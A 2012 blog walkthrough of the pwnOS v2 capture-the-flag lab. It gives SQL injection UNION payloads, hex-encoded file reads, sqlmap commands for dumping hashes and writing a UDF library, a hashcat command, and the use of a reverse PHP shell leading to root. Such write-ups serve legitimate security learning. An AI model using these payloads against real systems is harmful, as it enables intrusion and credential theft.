---
categories:
- vulnhub
- walkthrough
comments: false
date: "2012-08-09T00:56:45Z"
title: solving pwn0s v2
---

pwn0sv2 is version two in the pwn0s series (?), and can be found [here](http://boot2root.info/) at our good friend g0tmi1k's pentest page.  I previously did a write up on the first version of pwn0s and enjoyed it, so I was excited to see there was another version available.  Forewarning: obvious spoilers.

The zip comes packaged with a README with your standard disclaimer/info affair, along with the static IP.  10.10.10.100 is the set IP address.  I set my BT5 onto the 10.10.10.1/24 subnet and did a quick scan of the box:

```
Starting Nmap 6.01 ( http://nmap.org ) at 2012-07-14 18:20 CDT
Nmap scan report for 10.10.10.100
Host is up (0.00086s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (protocol 2.0)
| ssh-hostkey: 1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|_2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Welcome to this Site!
MAC Address: 08:00:27:36:5C:EF (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:kernel:2.6 cpe:/o:linux:kernel:3
OS details: Linux 2.6.38 - 3.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms 10.10.10.100
```

There's that pesky OpenSSH Debian build; we could try hunting for weak keys, but that looks to be a newer version of OpenSSH and likely not to be susceptible to that vulnerability.  Nonetheless, it may be worth keeping in mind as we move forward.  [Here's](http://www.debian.org/security/2008/dsa-1571) a link to the old advisory for the curious.

There also appears to be an HTTP website up.  Browsing around that gives us a couple of forms; /login.php and /register.php.  With so few services open, I'm given the impression that this is going to be a web vulnerability.  First thing I do in almost every registration field:

{{< figure class="center" src="/images/posts/2012/pwnos2_sqli.jpg" >}}

And low and behold, we're vulnerable to SQLi.  And away we go.

{{< figure class="center" src="/images/posts/2012/pwnos2_sqli2.jpg" >}}

After playing around with the UNION SELECT's, it finally settled on 8 columns and 4 being the displayed one.  So `' UNION SELECT 1,2,3,user(), 4,5,6,7,8;-- -`

If you try that, you'll notice you can't actually stick the entire thing into the login box.  Busting Burp open will fix that:

{{< figure class="center" src="/images/posts/2012/pwnos2_sqli3.jpg" >}}

Which gives us:

{{< figure class="center" src="/images/posts/2012/pwnos2_sqli4.jpg" >}}

Fantastic!  This means that the mysql daemon is running as root user.  That makes our SQLi attacks much more dangerous; UDF is now available to us.  Lets explore the system a bit more.

```
' UNION SELECT 1,2,3,version(),5,6,7,8-- -
      Welcome 5.1.54-1ubuntu4
' UNION SELECT 1,2,3,database(),5,6,7,8-- -
      Welcome ch16
' UNION SELECT 1,2,3,load_file(/etc/passwd),5,6,7,8-- - 
      An error occured(...)
```

Looks like they're at the very least escaping slashes.  No problem:

```
> echo -n '/etc/passwd' | xxd -ps -
> 2f6574632f706173737764
' UNION SELECT 1,2,3,load_file(0x2f6574632f706173737764),5,6,7,8-- -
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
landscape:x:104:110::/var/lib/landscape:/bin/false
dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
> echo -n '/etc/shadow' | xxd -ps -
> 2f6574632f736861646f77
' UNION SELECT 1,2,3,load_file(0x2f6574632f736861646f77),5,6,7,8-- -
> Welcome
```

Hm, looks like we can't hit /etc/shadow.  Weird.  Lets move on to rapidly enumerating the back end.  I switched over to sqlmap to give more info on the backend.  We already know the vulnerable form, we know the POST format (from our Burp session), and we know the database (from UNION queries above) so lets plug that in for some interesting stuff.

```
> python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=True' -p 'email' --tables -D 'ch16'
Database: ch16
Table: users
```

One table.  Let's check it out:

```
> python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=TRUE' -p 'email' --columns -T 'users' --dump    
```

This gave me a single user, 'Dan', with a user level 0 and his hash: `c2c4b4e51d9e23c02c15702c136c3e950ba9a4af`

I let sqlmap run its own cracker against the hash, then dumped it into oclHashCat:  
`cudaHashCat-plus64 -m 300 -a 3 -n 50 --gpu-watchdog=100 --force hash.txt ?l?l?l?l?l?l?l?l`

I then dumped database users to see what was there, and what the hashes were (assumed sha1(sha1(pass)), but you never know)

```
> python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=TRUE' -p 'email' --users
database management system users [108]:                                                              
          [*] 'debian-sys-maint'@'localhost'
          [*] 'root'@'127.0.0.1'
          [*] 'root'@'localhost'
          [*] 'root'@'web'
          
> python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=TRUE' -p 'email' --passwords
          [23:11:18] [INFO] fetching database users password hashes
          [23:11:18] [INFO] the SQL query used returns 4 entries
          [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
          [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
          [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
          [23:11:18] [INFO] retrieved: "debian-sys-maint","*9366FE2112E650C8E5523AE337B10A625C727943" 
```

Pretty much what I expected.  At this point I figured the next best thing to try, with my root privileges and all, is UDF injection.  If you're unfamiliar with UDF's, here's a very brief breakdown: a user defined function is a way to extend the functionality of a database by providing a function that's able to be evaluated by the backend database server.  In our case, we want something akin to an eval() or exec().  This can be done with the lib_mysqludf_sys library.  If you want more information on UDF injection, read [this](https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf) fantastic paper from BlackHat 2009 by Damele. 

Our attack method is then this: upload the precompiled library into the MySQL plugin directory, create our custom function, and execute some good stuff (passwd, addusr, whatever).  I first needed to know where the plugin directory was.  A quick [google](https://dev.mysql.com/doc/refman/5.0/en/server-system-variables.html) of MySQL system variables gives us an answer:

```
' UNION SELECT 1,2,3,@@plugin_dir,5,6,7,8-- -
Welcome /usr/lib/mysql/plugin
```

Now we just need to write our library there and create the functions:

```
python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=TRUE' -p 'email' --file-write=/lib_mysqludf_sys --file-dest=/usr/lib/mysql/plugin/
CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
SELECT * FROM information_schema.routines
```

The final SELECT there does not return our newly created function.  According to MySQL documentation, we need INSERT privileges.  Do we have them?

```
[*] 'root'@'localhost' (administrator) [27]:
                privilege: ALTER
                privilege: ALTER ROUTINE
                privilege: CREATE
                privilege: CREATE ROUTINE
                privilege: CREATE TEMPORARY TABLES
                privilege: CREATE USER
                privilege: CREATE VIEW
                privilege: DELETE
                privilege: DROP
                privilege: EVENT
                privilege: EXECUTE
                privilege: FILE
                privilege: INDEX
                privilege: INSERT
                privilege: LOCK TABLES
                privilege: PROCESS
                privilege: REFERENCES
                privilege: RELOAD
                privilege: REPLICATION CLIENT
                privilege: REPLICATION SLAVE
                privilege: SELECT
                privilege: SHOW DATABASES
                privilege: SHOW VIEW
                privilege: SHUTDOWN
                privilege: SUPER
                privilege: TRIGGER
                privilege: UPDATE
```

It appears we do.  In fact, it doesn't seem we have write access to anything; we can't even INSERT into any tables.  We'll come back to why this doesn't work in a bit.  For now, I threw a reverse PHP shell on the box for more control.  I used pentestmonkey's great php-reverse-shell, and soon enough had a prompt:

{{< figure class="center" src="/images/posts/2012/pwnos2_shell.jpg" >}}

I'm going to cut out a lot of my trial/error in finding some of this stuff, but note that there is a blog in /var/www.  This provides Simple PHP Blog, which just so happens to be [vulnerable](http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Simple+PHP+Blog&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=) to LFI; so there's another attack vector for the reverse PHP shell.  Also note the mysqld is listening on 127.0.0.1, which rules out that complex exploit David Kennedy [wrote](http://www.exploit-db.com/exploits/19092/).  Not to mention we're not in a real term.

Note that there are no privilege escalation vulnerabilities for that kernel or for that Ubuntu distribution.  MySQL does not appear to be UDF-injectable, and even though it's telling us we're root@localhost, we simply don't have it.  It is also worth nothing that an attempt to drop a shell script in /etc/cron.d/ and adding a cron entry got AppArmor a bit upset.

My next step was to see if there were any vulnerable binaries uploaded. 

```
find $1 -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- > /tmp/dump.txt
```

This dumped modified files by date, so newest at the top, oldest at the bottom.  After getting through all the modified /proc's, I noticed this monster: fakeroot.  Essentially this emulates a root environment but only allows certain file manipulations.  It can be used to run daemons in an environment that's root-like, but not.  This had to be why my MySQL UDF attempts were not working.  Moving on down the list, I noticed another file: /var/mysqli_connect.php.  Weird, what's a PHP file doing in var?

```
> cat /var/mysqli_connect.php
[...]
// Set the database access information as constants:
  DEFINE ('DB_USER', 'root');
  DEFINE ('DB_PASSWORD', 'root@ISIntS');
  DEFINE ('DB_HOST', 'localhost');
  DEFINE ('DB_NAME', 'ch16');
[...]
```

Oh.  That's...it?  Really?  Knowing that root was permitted to ssh in, I quickly gave it a shot:

{{< figure class="center" src="/images/posts/2012/pwnos2_root.jpg" >}}

Yup.  That was it.  I suppose the idea here is that incompetent developers can hard code root passwords into arbitrary PHP files laying around the system, but it just seems like more of a scavenger hunt in the end.  I was really hoping there was some obscure vulnerability in a binary, or some fun MySQL UDF injection I could've done.

All in all, fun, but once you've got a shell its an exercise in frustration.  Can't say I didn't learn anything though. 

Note:  If you're running BackTrack5 and need certain VirtualBox features (bidirectional clipboard, shared folders, etc.), you'll need to prepare kernel headers first.  Follow [these](http://www.backtrack-linux.org/wiki/index.php/Preparing_Kernel_Headers) instructions before installing Guest Additions.  If you've got it installed, just reinstall them.  You'll know it's successful if you don't get 'could not find kernel headers' errors.
